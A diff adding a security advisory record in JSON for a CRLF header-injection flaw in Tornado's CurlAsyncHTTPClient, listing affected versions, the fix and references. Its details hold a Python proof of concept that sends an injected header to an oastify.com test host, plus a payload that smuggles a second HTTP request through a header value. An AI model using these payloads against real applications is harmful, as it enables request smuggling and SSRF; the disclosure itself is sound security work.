@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-w235-7p84-xx57",
+  "modified": "2024-06-06T21:46:31Z",
+  "published": "2024-06-06T21:46:31Z",
+  "aliases": [
+
+  ],
+  "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
+  "details": "### Summary\nTornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tornado"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.4.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 6.4.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tornadoweb/tornado"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-93"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-06-06T21:46:31Z",
+    "nvd_published_at": null
+  }
+}
